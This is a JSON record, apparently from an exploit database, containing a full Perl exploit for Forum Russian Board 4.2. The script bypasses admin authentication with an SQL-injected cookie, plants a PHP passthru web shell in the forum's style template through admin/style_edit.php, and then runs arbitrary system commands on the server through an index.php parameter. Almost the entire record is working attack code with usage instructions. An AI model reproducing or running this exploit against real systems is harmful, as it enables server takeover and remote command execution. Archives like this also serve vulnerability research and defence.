{
  "id": "1060",
  "title": "Forum Russian Board 4.2 - Full Command Execution",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#!/usr/bin/perl\r\n\r\n# Forum Russian Board 4.2 Full (FRB) (http://www.carline.ru , http://frb.ru)\r\n# command execution exploit by RST/GHC (http://rst.void.ru , http://ghc.ru)\r\n# bugs found by foster & 1dt.w0lf , xpl coded by 1dt.w0lf \r\n# RST/GHC - http://rst.void.ru , http://ghc.ru\r\n\r\nuse IO::Socket;\r\nuse Getopt::Std;\r\n\r\ngetopts(\"h:p:u:i:c:\");\r\n\r\n$host  = $opt_h;\r\n$path  = $opt_p;\r\n$user  = $opt_u;\r\n$id    = $opt_i;\r\n$cmd   = $opt_c || 'create';\r\n\r\n$cmdspl = \"%26%26\"; # ;      - for unix\r\n                    # %26%26 - for windows\r\n\r\nif(!$host || !$path) { usage(); }\r\nif(($cmd eq 'create' || $cmd eq 'delete') && (!$user || !$id)) { usage(); }\r\n\r\n$host =~ s/(http:\\/\\/)//g;\r\n$cook = $user.\"' /*\";\r\n\r\nif($cmd eq 'create' || $cmd eq 'delete'){\r\nhead();\r\nprint \">>> CREATE SHELL\\n\" if ($cmd eq 'create');\r\nprint \">>> DELETE SHELL\\n\" if ($cmd eq 'delete');\r\n$sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"[-] CONNECT FAILED\\n\";\r\nprint $sock \"GET ${path}admin/style_edit.php HTTP/1.1\\n\";\r\nprint $sock \"Host: $host\\n\";\r\nprint $sock \"Accept: */*\\n\";\r\nprint $sock \"Cookie: board_user_cook=$cook;board_user_id=$id\\n\";\r\nprint $sock \"Connection: close\\n\\n\";\r\nprint \"GETTING CURRENT STYLE ... [\";\r\nwhile ($res = <$sock>)\r\n{\r\n if($res =~ /(.*)<\\/textarea>/) { $data .= $1; $p = 0; }\r\n $data .= $res if $p;\r\n if($res =~ s/(.*)(<textarea)([^<>]*)([>])(.*)/$5/) { $data .= $res; $p = 1; }\r\n}\r\n\r\nif(length($data)>0) { print \" DONE ]\\n\"; }\r\nelse { print \" FAILED ]\\n\"; exit(); }\r\n\r\nif($data =~ /rst_ghc/)\r\n {\r\n if($cmd eq 'create') { print \"SHELL ALREADY EXIST!\"; exit(); }\r\n if($cmd eq 'delete') \r\n  {  \r\n  print \"SHELL EXIST.\\nDELETING SHELL.\\n\"; \r\n  $data =~ s/\\s*<\\? if\\(\\$_GET\\[rst_ghc\\]\\)\\{ passthru\\(\\$_GET\\[rst_ghc\\]\\); \\} \\?>//g;\r\n  }\r\n }\r\nelse\r\n {\r\n if($cmd eq 'create') \r\n  {\r\n  $data .= \"\\n\";\r\n  $data .= '<? if($_GET[rst_ghc]){ passthru($_GET[rst_ghc]); } ?>';\r\n  }\r\n if($cmd eq 'delete') { print \"SHELL NOT EXIST. CAN'T DELETE.\"; exit(); }\r\n }\r\n\r\n$data =~ s/(.)/\"%\".uc(sprintf(\"%2.2x\",ord($1)))/eg;\r\n$post = \"message=${data}&form_h=yes&style_edit_ok=%C8%E7%EC%E5%ED%E8%F2%FC\";\r\nprint \"CREATE NEW STYLE ...[\";\r\n$sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"[-] CONNECT FAILED\\r\\n\";\r\nprint $sock \"POST ${path}admin/style_edit.php HTTP/1.1\\n\";\r\nprint $sock \"Host: $host\\n\";\r\nprint $sock \"Cookie: board_user_cook=$cook;board_user_id=$id\\n\";\r\nprint $sock \"Content-Type: application/x-www-form-urlencoded\\n\";\r\nprint $sock \"Content-length: \".length($post).\"\\n\\n\";\r\nprint $sock \"$post\";\r\nprint $sock \"\\n\\n\";\r\nprint \" DONE ]\\n\"; \r\nif($cmd eq 'create') { print \"SHELL CREATED SUCCESSFULLY! NOW YOU CAN TRY EXECUTE COMMAND.\"; }\r\nif($cmd eq 'delete') { print \"SHELL DELETED!\"; }\r\n}\r\nelse\r\n{\r\nhead();\r\nprint \">>> COMMAND EXECUTE\\n\";\r\n$sock = IO::Socket::INET->new( Proto => \"tcp\", PeerAddr => \"$host\", PeerPort => \"80\") || die \"[-] CONNECT FAILED\\n\";\r\nprint $sock \"GET ${path}index.php?rst_ghc=echo%20_START_%20$cmdspl%20$cmd%20$cmdspl%20echo%20_END_%20; HTTP/1.1\\n\";\r\nprint $sock \"Host: $host\\n\";\r\nprint $sock \"Accept: */*\\n\";\r\nprint $sock \"Connection: close\\n\\n\";\r\n\r\nwhile ($res = <$sock>)\r\n{\r\n if($res =~ /^_END_/) { $p = 0; }\r\n $data .= $res if $p;\r\n if($res =~ /^_START_/) { $p = 1; }\r\n}\r\nif(length($data)>0) { \r\n                      print \"-----------------------------------------------------------------\\n\"; \r\n                      print $data; \r\n                      print \"-----------------------------------------------------------------\\n\";\r\n                      exit(0);\r\n                    }\r\nelse { print \"[-] FAILED\\nMaybe you forget create shell first?\\n\"; exit(0); }\r\n\r\n}\r\n\r\nsub usage()\r\n{\r\n head();\r\n print \" USAGE : r57frb.pl [options]\\n\\n\";\r\n print \" Options: \\n\";\r\n print \"          -h - host e.g. '127.0.0.1' , 'www.frb.ru'\\n\";\r\n print \"          -p - path to forum e.g. '/frb/' , '/forum/'\\n\";\r\n print \"          -u - admin username e.g. 'admin'\\n\";\r\n print \"          -i - admin id e.g. '1'\\n\";\r\n print \"          -c [create|delete|cmd]\\n\";\r\n print \"              create - for create shell\\n\";\r\n print \"              delete - for delete shell\\n\";\r\n print \"              cmd - any command for execute\\n\";\r\n print \"-----------------------------------------------------------------\\n\"; \r\nexit(0);\r\n}\r\n\r\nsub head()\r\n{\r\n print \"-----------------------------------------------------------------\\n\";\r\n print \"Forum Russian Board 4.0 Full command execution exploit by RST/GHC\\n\";\r\n print \"-----------------------------------------------------------------\\n\";\r\n}\r\n\r\n# milw0rm.com [2005-06-21]",
  "url": "https://www.exploit-db.com/exploits/1060"
}